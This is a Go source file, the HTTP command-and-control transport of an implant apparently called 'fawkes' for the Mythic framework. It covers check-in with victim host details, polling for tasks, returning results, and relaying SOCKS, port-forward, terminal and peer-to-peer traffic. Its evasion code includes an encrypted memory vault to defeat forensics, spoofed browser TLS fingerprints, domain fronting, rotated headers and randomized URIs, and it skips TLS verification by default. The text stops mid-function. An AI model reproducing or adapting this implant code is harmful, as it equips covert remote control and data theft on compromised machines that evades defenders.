package http

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
	"sync/atomic"
	"time"

	"github.com/andybalholm/brotli"

	"fawkes/pkg/structs"
)

// configVault holds AES-256-GCM encrypted C2 configuration. Sensitive fields
// (C2 URL, encryption key, user agent, endpoints) are stored encrypted and
// only decrypted into local variables for the duration of each HTTP operation.
// This reduces the plaintext exposure window from "entire process lifetime"
// to "single HTTP request duration" (~milliseconds).
type configVault struct {
	key  []byte // AES-256-GCM key (random, generated at SealConfig)
	blob []byte // Encrypted JSON of sensitiveConfig
}

// sensitiveConfig holds the C2 configuration fields that should not persist
// as plaintext in memory. These reveal C2 infrastructure and enable traffic decryption.
type sensitiveConfig struct {
	BaseURL        string            `json:"b"`
	FallbackURLs   []string          `json:"f,omitempty"`
	UserAgent      string            `json:"a"`
	UserAgentPool  []string          `json:"ap,omitempty"`
	EncryptionKey  string            `json:"k"`
	CallbackUUID   string            `json:"c"`
	HostHeader     string            `json:"h"`
	GetEndpoint    string            `json:"g"`
	PostEndpoint   string            `json:"p"`
	CustomHeaders  map[string]string `json:"x,omitempty"`
	ContentTypes   []string          `json:"ct,omitempty"`
}

// HTTPProfile handles HTTP communication with Mythic
type HTTPProfile struct {
	BaseURL       string
	UserAgent     string
	EncryptionKey string
	MaxRetries    int
	SleepInterval int
	Jitter        int
	Debug         bool
	GetEndpoint   string
	PostEndpoint  string
	HostHeader    string            // Override Host header for domain fronting
	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
	ContentTypes  []string          // Content-Type rotation pool for request body
	UserAgentPool []string          // User-Agent rotation pool (if set, overrides single UserAgent)
	client        *http.Client
	CallbackUUID  string // Store callback UUID from initial checkin
	ctIndex       atomic.Uint32 // Round-robin index for Content-Type rotation
	uaIndex       atomic.Uint32 // Round-robin index for User-Agent rotation

	// Fallback C2 URLs for automatic failover when primary is unreachable.
	FallbackURLs []string
	// activeURLIdx tracks which URL in the list is currently being used.
	// 0 = primary (BaseURL), 1+ = fallback URLs. Updated on failover.
	// Accessed atomically — makeRequest may be called concurrently from
	// multiple PostResponse goroutines and the GetTasking loop.
	activeURLIdx atomic.Int32

	// Config vault — encrypted storage for sensitive C2 fields.
	// When active, the struct fields above are zeroed and all access
	// goes through getConfig() which decrypts on demand.
	vault *configVault

	// P2P delegate hooks — set by main.go when TCP P2P children are supported.
	// GetDelegatesOnly returns only pending delegate messages (no edges). Used by GetTasking.
	// GetDelegatesAndEdges returns delegates AND edge notifications. Used by PostResponse.
	// HandleDelegates routes incoming delegate messages from Mythic to the appropriate children.
	GetDelegatesOnly     func() []structs.DelegateMessage
	GetDelegatesAndEdges func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
	HandleDelegates      func(delegates []structs.DelegateMessage)

	// Rpfwd hooks — set by main.go for reverse port forward message routing.
	GetRpfwdOutbound func() []structs.SocksMsg
	HandleRpfwd      func(msgs []structs.SocksMsg)

	// Interactive hooks — set by main.go for PTY/terminal bidirectional streaming.
	GetInteractiveOutbound func() []structs.InteractiveMsg
	HandleInteractive      func(msgs []structs.InteractiveMsg)
}

// NewHTTPProfile creates a new HTTP profile
func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify, tlsFingerprint string, fallbackURLs, contentTypes []string) *HTTPProfile {
	profile := &HTTPProfile{
		BaseURL:       baseURL,
		UserAgent:     userAgent,
		EncryptionKey: encryptionKey,
		MaxRetries:    maxRetries,
		SleepInterval: sleepInterval,
		Jitter:        jitter,
		Debug:         debug,
		GetEndpoint:   getEndpoint,
		PostEndpoint:  postEndpoint,
		HostHeader:    hostHeader,
		FallbackURLs:  fallbackURLs,
		ContentTypes:  contentTypes,
	}

	// Configure TLS based on verification mode
	tlsConfig := buildTLSConfig(tlsVerify)

	// Configure transport with optional proxy
	transport := &http.Transport{
		TLSClientConfig:     tlsConfig,
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 5,
		IdleConnTimeout:     90 * time.Second,
	}

	// Configure proxy if specified
	if proxyURL != "" {
		if proxyU, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(proxyU)
		}
	}

	// If a TLS fingerprint is specified (not "go" or empty), use uTLS to spoof
	// the TLS ClientHello. This replaces Go's default TLS stack with uTLS for
	// HTTPS connections, producing a browser-matching JA3 fingerprint.
	if helloID, ok := tlsFingerprintID(tlsFingerprint); ok {
		transport.DialTLSContext = buildUTLSTransportDialer(helloID, tlsConfig)
		// Clear TLSClientConfig — uTLS handles TLS now, and having both
		// causes http.Transport to skip DialTLSContext for HTTPS.
		transport.TLSClientConfig = nil
	}

	profile.client = &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
	}

	return profile
}

// SealConfig encrypts all sensitive C2 configuration fields into an AES-256-GCM
// vault and zeros the plaintext struct fields. After sealing, fields are only
// decrypted on-demand for the duration of each HTTP operation. This reduces the
// memory forensics exposure window from the entire process lifetime to individual
// HTTP request durations (~milliseconds).
func (h *HTTPProfile) SealConfig() error {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("config vault key generation failed: %w", err)
	}

	cfg := &sensitiveConfig{
		BaseURL:       h.BaseURL,
		FallbackURLs:  h.FallbackURLs,
		UserAgent:     h.UserAgent,
		UserAgentPool: h.UserAgentPool,
		EncryptionKey: h.EncryptionKey,
		CallbackUUID:  h.CallbackUUID,
		HostHeader:    h.HostHeader,
		GetEndpoint:   h.GetEndpoint,
		PostEndpoint:  h.PostEndpoint,
		CustomHeaders: h.CustomHeaders,
		ContentTypes:  h.ContentTypes,
	}

	plaintext, err := json.Marshal(cfg)
	if err != nil {
		vaultZeroBytes(key)
		return fmt.Errorf("config vault marshal failed: %w", err)
	}

	blob := vaultEncrypt(key, plaintext)
	vaultZeroBytes(plaintext)
	if blob == nil {
		vaultZeroBytes(key)
		return fmt.Errorf("config vault encryption failed")
	}

	h.vault = &configVault{key: key, blob: blob}

	// Zero plaintext struct fields — all access now goes through the vault
	h.BaseURL = ""
	h.FallbackURLs = nil
	h.UserAgent = ""
	h.EncryptionKey = ""
	h.CallbackUUID = ""
	h.HostHeader = ""
	h.GetEndpoint = ""
	h.PostEndpoint = ""
	h.CustomHeaders = nil
	h.ContentTypes = nil
	h.UserAgentPool = nil

	return nil
}

// getConfig returns the current C2 configuration. If the vault is active,
// decrypts and returns the config from the vault. Otherwise returns the
// plaintext struct fields directly. Each call creates an independent copy —
// safe for concurrent use from multiple goroutines.
func (h *HTTPProfile) getConfig() *sensitiveConfig {
	if h.vault == nil {
		return &sensitiveConfig{
			BaseURL:       h.BaseURL,
			FallbackURLs:  h.FallbackURLs,
			UserAgent:     h.UserAgent,
			UserAgentPool: h.UserAgentPool,
			EncryptionKey: h.EncryptionKey,
			CallbackUUID:  h.CallbackUUID,
			HostHeader:    h.HostHeader,
			GetEndpoint:   h.GetEndpoint,
			PostEndpoint:  h.PostEndpoint,
			CustomHeaders: h.CustomHeaders,
			ContentTypes:  h.ContentTypes,
		}
	}

	plaintext := vaultDecrypt(h.vault.key, h.vault.blob)
	if plaintext == nil {
		return nil
	}

	var cfg sensitiveConfig
	if err := json.Unmarshal(plaintext, &cfg); err != nil {
		vaultZeroBytes(plaintext)
		return nil
	}
	vaultZeroBytes(plaintext)
	return &cfg
}

// IsSealed returns true if the config vault is active (fields are encrypted).
func (h *HTTPProfile) IsSealed() bool {
	return h.vault != nil
}

// UpdateCallbackUUID updates the callback UUID in the vault (or struct field
// if vault is not active). Called after Checkin to store the server-assigned UUID.
func (h *HTTPProfile) UpdateCallbackUUID(uuid string) {
	if h.vault != nil {
		cfg := h.getConfig()
		if cfg != nil {
			cfg.CallbackUUID = uuid
			plaintext, err := json.Marshal(cfg)
			if err == nil {
				newBlob := vaultEncrypt(h.vault.key, plaintext)
				vaultZeroBytes(plaintext)
				if newBlob != nil {
					vaultZeroBytes(h.vault.blob)
					h.vault.blob = newBlob
				}
			}
		}
		return
	}
	h.CallbackUUID = uuid
}

// buildTLSConfig creates a TLS configuration based on the verification mode.
// Modes: "none" (skip verification), "system-ca" (OS trust store), "pinned:<hex-sha256>" (cert pin)
func buildTLSConfig(tlsVerify string) *tls.Config {
	switch {
	case tlsVerify == "system-ca":
		// Use the operating system's certificate trust store
		return &tls.Config{
			InsecureSkipVerify: false,
			MinVersion:         tls.VersionTLS12,
		}
	case strings.HasPrefix(tlsVerify, "pinned:"):
		// Pin to a specific certificate SHA-256 fingerprint
		fingerprint := strings.TrimPrefix(tlsVerify, "pinned:")
		expectedHash, err := hex.DecodeString(fingerprint)
		if err != nil || len(expectedHash) != 32 {
			// Invalid fingerprint — fall back to skip verify to avoid bricking the agent
			return &tls.Config{InsecureSkipVerify: true}
		}
		return &tls.Config{
			InsecureSkipVerify: true, // We do our own verification in VerifyPeerCertificate
			MinVersion:         tls.VersionTLS12,
			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
				if len(rawCerts) == 0 {
					return fmt.Errorf("no certificates presented")
				}
				// Hash the leaf certificate's raw DER bytes
				hash := sha256.Sum256(rawCerts[0])
				if !bytes.Equal(hash[:], expectedHash) {
					return fmt.Errorf("certificate fingerprint mismatch")
				}
				return nil
			},
		}
	default:
		// "none" or unrecognized — skip verification (backward compatible default)
		return &tls.Config{InsecureSkipVerify: true}
	}
}

// Checkin performs the initial checkin with Mythic
func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
	cfg := h.getConfig()
	if cfg == nil {
		return fmt.Errorf("failed to decrypt C2 configuration")
	}

	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		IPs:          []string{agent.InternalIP},
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin message: %w", err)
	}

	// Encrypt if encryption key is provided
	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return fmt.Errorf("encryption failed: %w", err)
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Send checkin request to configured endpoint
	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
	if err != nil {
		return fmt.Errorf("checkin request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("checkin failed with status: %d", resp.StatusCode)
	}

	// Read and process the checkin response to extract callback UUID
	respBody, err := readResponseBody(resp)
	if err != nil {
		return fmt.Errorf("failed to read checkin response: %w", err)
	}

	// Decrypt the checkin response if needed
	var decryptedResponse []byte
	if cfg.EncryptionKey != "" {
		// Base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return fmt.Errorf("failed to decode checkin response: %w", err)
		}

		// Decrypt the response
		decryptedResponse, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return fmt.Errorf("failed to decrypt checkin response: %w", err)
		}
	} else {
		decryptedResponse = respBody
	}

	// Parse the response to extract callback UUID
	var checkinResponse map[string]interface{}
	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	// Extract callback UUID (commonly called 'id' or 'uuid' in response)
	if callbackID, exists := checkinResponse["id"]; exists {
		if callbackStr, ok := callbackID.(string); ok {
			h.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
		if callbackStr, ok := callbackUUID.(string); ok {
			h.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else {
		log.Printf("no session id, using default")
		h.UpdateCallbackUUID(agent.PayloadUUID)
	}

	return nil
}

// GetTasking retrieves tasks and inbound SOCKS data from Mythic, sending any pending outbound SOCKS data
func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	cfg := h.getConfig()
	if cfg == nil {
		return nil, nil, fmt.Errorf("failed to decrypt C2 configuration")
	}

	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: -1, // Get all pending tasks (important for SOCKS throughput)
		Socks:       outboundSocks,
		// Include agent identification for checkin updates
		PayloadUUID: h.getActiveUUID(agent, cfg), // Use callback UUID if available
		PayloadType: "fawkes",
		C2Profile:   "http",
	}

	// Collect delegate messages from linked P2P children (no edges — GetTasking can't carry them)
	if h.GetDelegatesOnly != nil {
		delegates := h.GetDelegatesOnly()
		if len(delegates) > 0 {
			taskingMsg.Delegates = delegates
		}
	}

	// Collect rpfwd outbound messages
	if h.GetRpfwdOutbound != nil {
		rpfwdMsgs := h.GetRpfwdOutbound()
		if len(rpfwdMsgs) > 0 {
			taskingMsg.Rpfwd = rpfwdMsgs
		}
	}

	// Collect interactive outbound messages (PTY output)
	if h.GetInteractiveOutbound != nil {
		interactiveMsgs := h.GetInteractiveOutbound()
		if len(interactiveMsgs) > 0 {
			taskingMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
	}

	// Encrypt if encryption key is provided
	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return nil, nil, fmt.Errorf("encryption failed: %w", err)
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	activeUUID := h.getActiveUUID(agent, cfg)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("get tasking request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
	}

	respBody, err := readResponseBody(resp)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to read response body: %w", err)
	}

	// Decrypt the response if encryption key is provided
	var decryptedData []byte
	if cfg.EncryptionKey != "" {
		// First, base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decode response: %w", err)
		}

		// Decrypt the decoded data
		decryptedData, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
		}
	} else {
		decryptedData = respBody
	}

	// Parse the decrypted response - Mythic returns different formats
	var taskResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
		// If not JSON, might be no tasks
		return []structs.Task{}, nil, nil
	}

	// Extract tasks from response
	var tasks []structs.Task
	if taskList, exists := taskResponse["tasks"]; exists {
		if taskArray, ok := taskList.([]interface{}); ok {
			for _, taskData := range taskArray {
				if taskMap, ok := taskData.(map[string]interface{}); ok {
					task := structs.NewTask(
						getString(taskMap, "id"),
						getString(taskMap, "command"),
						getString(taskMap, "parameters"),
					)
					tasks = append(tasks, task)
				}
			}
		}
	}

	// Extract SOCKS messages from response
	var inboundSocks []structs.SocksMsg
	if socksList, exists := taskResponse["socks"]; exists {
		if socksRaw, err := json.Marshal(socksList); err == nil {
			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
				log.Printf("proxy parse error: %v", err)
			}
		}
	}

	// Route rpfwd messages from Mythic to the rpfwd manager
	if h.HandleRpfwd != nil {
		if rpfwdList, exists := taskResponse["rpfwd"]; exists {
			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
				var rpfwdMsgs []structs.SocksMsg
				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
					h.HandleRpfwd(rpfwdMsgs)
				}
			}
		}
	}

	// Route interactive messages from Mythic to tasks (PTY input)
	if h.HandleInteractive != nil {
		if interactiveList, exists := taskResponse["interactive"]; exists {
			if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
				var interactiveMsgs []structs.InteractiveMsg
				if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
					h.HandleInteractive(interactiveMsgs)
				}
			}
		}
	}

	// Route delegate messages from Mythic to linked P2P children
	if h.HandleDelegates != nil {
		if delegateList, exists := taskResponse["delegates"]; exists {
			if delegateRaw, err := json.Marshal(delegateList); err == nil {
				var delegates []structs.DelegateMessage
				if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
					h.HandleDelegates(delegates)
				}
			}
		}
	}

	return tasks, inboundSocks, nil
}

// decryptResponse decrypts a response from Mythic using the same format as Freyja.
// The encKey parameter is the base64-encoded AES key from the C2 profile.
func (h *HTTPProfile) decryptResponse(encryptedData []byte, encKey string) ([]byte, error) {
	if encKey == "" {
		return encryptedData, nil // No encryption
	}

	// Decode the base64 key
	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	// The response format should be: UUID (36 bytes) + IV (16 bytes) + Ciphertext + HMAC (32 bytes)
	if len(encryptedData) < 36+16+32 {
		return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
	}

	// Skip UUID (first 36 bytes), extract IV (next 16 bytes)
	iv := encryptedData[36:52]

	// Extract HMAC (last 32 bytes)
	hmacBytes := encryptedData[len(encryptedData)-32:]

	// Extract ciphertext (everything between IV and HMAC)
	ciphertext := encryptedData[52 : len(encryptedData)-32]

	// Verify HMAC
	mac := hmac.New(sha256.New, key)
	dataForHmac := encryptedData[:len(encryptedData)-32] // Everything except HMAC
	mac.Write(dataForHmac)
	expectedHmac := mac.Sum(nil)

	if !hmac.Equal(hmacBytes, expectedHmac) {
		// Try HMAC on IV + ciphertext (alternative method for Mythic)
		mac3 := hmac.New(sha256.New, key)
		mac3.Write(encryptedData[36 : len(encryptedData)-32]) // IV + ciphertext
		expectedHmac3 := mac3.Sum(nil)

		if !hmac.Equal(hmacBytes, expectedHmac3) {
			return nil, fmt.Errorf("HMAC verification failed with all methods")
		}
	}

	// Decrypt using AES-CBC
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	if len(ciphertext) == 0 || len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("invalid ciphertext length: %d", len(ciphertext))
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS#7 padding
	padding := int(plaintext[len(plaintext)-1])
	if padding > aes.BlockSize || padding == 0 {
		return nil, fmt.Errorf("invalid padding")
	}

	for i := len(plaintext) - padding; i < len(plaintext); i++ {
		if plaintext[i] != byte(padding) {
			return nil, fmt.Errorf("invalid padding")
		}
	}

	return plaintext[:len(plaintext)-padding], nil
}

// GetCallbackUUID returns the callback UUID assigned by Mythic after checkin.
// Reads from the vault if config is sealed.
func (h *HTTPProfile) GetCallbackUUID() string {
	if h.vault != nil {
		if cfg := h.getConfig(); cfg != nil {
			return cfg.CallbackUUID
		}
	}
	return h.CallbackUUID
}

// getActiveUUID returns the callback UUID if available, otherwise the payload UUID.
// Reads from the provided config to avoid accessing zeroed struct fields.
func (h *HTTPProfile) getActiveUUID(agent *structs.Agent, cfg *sensitiveConfig) string {
	if cfg != nil && cfg.CallbackUUID != "" {
		return cfg.CallbackUUID
	}
	if h.CallbackUUID != "" {
		return h.CallbackUUID
	}
	return agent.PayloadUUID
}

// PostResponse sends a response back to Mythic, optionally including pending SOCKS data
func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	cfg := h.getConfig()
	if cfg == nil {
		return nil, fmt.Errorf("failed to decrypt C2 configuration")
	}

	responseMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
		Socks:     socks,
	}

	// Collect rpfwd outbound messages
	if h.GetRpfwdOutbound != nil {
		rpfwdMsgs := h.GetRpfwdOutbound()
		if len(rpfwdMsgs) > 0 {
			responseMsg.Rpfwd = rpfwdMsgs
		}
	}

	// Collect delegate messages and edge notifications from linked P2P children
	if h.GetDelegatesAndEdges != nil {
		delegates, edges := h.GetDelegatesAndEdges()
		if len(delegates) > 0 {
			responseMsg.Delegates = delegates
		}
		if len(edges) > 0 {
			responseMsg.Edges = edges
		}
	}

	// Collect interactive outbound messages (PTY output)
	if h.GetInteractiveOutbound != nil {
		interactiveMsgs := h.GetInteractiveOutbound()
		if len(interactiveMsgs) > 0 {
			responseMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(responseMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal response message: %w", err)
	}

	// Encrypt if encryption key is provided
	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("encryption failed: %w", err)
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	// Must use callback UUID (not payload UUID) after checkin
	activeUUID := h.getActiveUUID(agent, cfg)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
	if err != nil {
		return nil, fmt.Errorf("post response request failed: %w", err)
	}
	defer resp.Body.Close()

	// Read response body
	respBody, err := readResponseBody(resp)
	if err != nil {
		return nil, fmt.Errorf("failed to read PostResponse body: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
	}

	// Decrypt the response if encryption key is provided (same as GetTasking)
	var decryptedData []byte
	if cfg.EncryptionKey != "" {
		// First, base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return nil, fmt.Errorf("failed to decode PostResponse: %w", err)
		}

		// Decrypt the decoded data
		decryptedData, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt PostResponse: %w", err)
		}
	} else {
		decryptedData = respBody
	}

	// Route any PostResponse data (delegates, rpfwd) from Mythic
	if len(decryptedData) > 0 {
		var postRespData map[string]interface{}
		if err := json.Unmarshal(decryptedData, &postRespData); err == nil {
			// Route rpfwd messages
			if h.HandleRpfwd != nil {
				if rpfwdList, exists := postRespData["rpfwd"]; exists {
					if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
						var rpfwdMsgs []structs.SocksMsg
						if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
							h.HandleRpfwd(rpfwdMsgs)
						}
					}
				}
			}
			// Route delegate messages
			if h.HandleDelegates != nil {
				if delegateList, exists := postRespData["delegates"]; exists {
					if delegateRaw, err := json.Marshal(delegateList); err == nil {
						var delegates []structs.DelegateMessage
						if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
							h.HandleDelegates(delegates)
						}
					}
				}
			}
			// Route interactive messages (PTY input)
			if h.HandleInteractive != nil {
				if interactiveList, exists := postRespData["interactive"]; exists {
					if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
						var interactiveMsgs []structs.InteractiveMsg
						if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
							h.HandleInteractive(interactiveMsgs)
						}
					}
				}
			}
		}
	}

	return decryptedData, nil
}

// allURLs returns the full URL list in failover order, starting from activeURLIdx.
// Index 0 = BaseURL, 1+ = FallbackURLs.
func (h *HTTPProfile) allURLs(cfg *sensitiveConfig) []string {
	var baseURL string
	var fallbacks []string
	if cfg != nil {
		baseURL = cfg.BaseURL
		fallbacks = cfg.FallbackURLs
	} else {
		baseURL = h.BaseURL
		fallbacks = h.FallbackURLs
	}

	urls := make([]string, 0, 1+len(fallbacks))
	urls = append(urls, baseURL)
	urls = append(urls, fallbacks...)

	// Rotate so the currently active URL is first
	idx := int(h.activeURLIdx.Load())
	if idx > 0 && idx < len(urls) {
		rotated := make([]string, len(urls))
		copy(rotated, urls[idx:])
		copy(rotated[len(urls)-idx:], urls[:idx])
		return rotated
	}
	return urls
}

// resolveURITokens replaces randomization tokens in a URI path at request time.
// Supported tokens:
//   - {rand:N}  — N random hex characters (e.g., {rand:8} → "a3f82b1c")
//   - {int:M-N} — random integer between M and N (e.g., {int:1-100} → "42")
//
// If the path contains no tokens, it is returned unchanged (backward-compatible).
func resolveURITokens(path string) string {
	if !strings.Contains(path, "{") {
		return path
	}

	result := path

	// Replace {rand:N} tokens
	for {
		start := strings.Index(result, "{rand:")
		if start == -1 {
			break
		}
		end := strings.Index(result[start:], "}")
		if end == -1 {
			break
		}
		end += start
		nStr := result[start+6 : end]
		n := 8 // default length
		if parsed, err := fmt.Sscanf(nStr, "%d", &n); err != nil || parsed != 1 || n <= 0 {
			n = 8
		}
		if n > 64 {
			n = 64
		}
		b := make([]byte, (n+1)/2)
		rand.Read(b)
		result = result[:start] + hex.EncodeToString(b)[:n] + result[end+1:]
	}

	// Replace {int:M-N} tokens
	for {
		start := strings.Index(result, "{int:")
		if start == -1 {
			break
		}
		end := strings.Index(result[start:], "}")
		if end == -1 {
			break
		}
		end += start
		rangeStr := result[start+5 : end]
		var lo, hi int
		if _, err := fmt.Sscanf(rangeStr, "%d-%d", &lo, &hi); err != nil || lo >= hi {
			result = result[:start] + "0" + result[end+1:]
			continue
		}
		b := make([]byte, 4)
		rand.Read(b)
		val := lo + int(uint32(b[0])<<24|uint32(b[1])<<16|uint32(b[2])<<8|uint32(b[3]))%(hi-lo+1)
		result = result[:start] + fmt.Sprintf("%d", val) + result[end+1:]
	}

	return result
}

// makeRequest is a helper function to make HTTP requests with automatic failover.
// If the primary URL fails, it tries each fallback URL before returning an error.
// The cfg parameter provides sensitive fields (BaseURL, UserAgent, etc.)
// from the decrypted vault rather than reading from zeroed struct fields.
func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensitiveConfig) (*http.Response, error) {
	// Resolve sensitive fields from config (vault) or struct (unsealed fallback)
	userAgent := h.UserAgent
	hostHeader := h.HostHeader
	var customHeaders map[string]string
	var contentTypes []string
	var uaPool []string
	if cfg != nil {
		userAgent = cfg.UserAgent
		uaPool = cfg.UserAgentPool
		hostHeader = cfg.HostHeader
		customHeaders = cfg.CustomHeaders
		contentTypes = cfg.ContentTypes
	} else {
		uaPool = h.UserAgentPool
		customHeaders = h.CustomHeaders
		contentTypes = h.ContentTypes
	}

	// Rotate User-Agent per request if pool is configured
	if len(uaPool) > 0 {
		idx := h.uaIndex.Add(1) - 1
		userAgent = uaPool[idx%uint32(len(uaPool))]
	}

	// Resolve URI randomization tokens (e.g., /api/v{int:1-3}/{rand:8})
	path = resolveURITokens(path)

	// Get all URLs in failover order (rotated so active URL is first)
	originalIdx := int(h.activeURLIdx.Load())
	urls := h.allURLs(cfg)
	var lastErr error

	for i, baseURL := range urls {
		// Ensure proper URL construction with forward slash
		var reqURL string
		if strings.HasSuffix(baseURL, "/") && strings.HasPrefix(path, "/") {
			reqURL = baseURL + path[1:]
		} else if !strings.HasSuffix(baseURL, "/") && !strings.HasPrefix(path, "/") {
			reqURL = baseURL + "/" + path
		} else {
			reqURL = baseURL + path
		}

		var reqBody io.Reader
		if body != nil {
			reqBody = bytes.NewReader(body)
		}

		req, err := http.NewRequest(method, reqURL, reqBody)
		if err != nil {
			lastErr = fmt.Errorf("failed to create request for %s: %w", baseURL, err)
			continue
		}

		// Set browser-realistic default headers
		req.Header.Set("User-Agent", userAgent)
		if body != nil {
			// Cycle through configured content types, or use default
			ct := "application/x-www-form-urlencoded"
			if len(contentTypes) > 0 {
				idx := h.ctIndex.Add(1) - 1
				ct = contentTypes[idx%uint32(len(contentTypes))]
			}
			req.Header.Set("Content-Type", ct)
		}
		req.Header.Set("Accept", chromeAcceptHeader)
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Accept-Encoding", chromeAcceptEncoding)

		if secChUa := generateSecChUa(userAgent); secChUa != "" {
			req.Header.Set("Sec-Ch-Ua", secChUa)
			req.Header.Set("Sec-Ch-Ua-Mobile", generateSecChUaMobile(userAgent))
			req.Header.Set("Sec-Ch-Ua-Platform", generateSecChUaPlatform(userAgent))
		}

		req.Header.Set("Upgrade-Insecure-Requests", "1")

		for k, v := range customHeaders {
			req.Header.Set(k, v)
		}

		if hostHeader != "" {
			req.Host = hostHeader
		}

		resp, err := h.client.Do(req)
		if err != nil {
			if resp != nil && resp.Body != nil {
				resp.Body.Close()
			}
			lastErr = fmt.Errorf("HTTP request to %s failed: %w", baseURL, err)
			if len(urls) > 1 {
				log.Printf("failover: endpoint unavailable")
			}
			continue
		}

		// Success — remember which URL worked for next time
		newIdx := (originalIdx + i) % len(urls)
		if newIdx != originalIdx {
			h.activeURLIdx.Store(int32(newIdx))
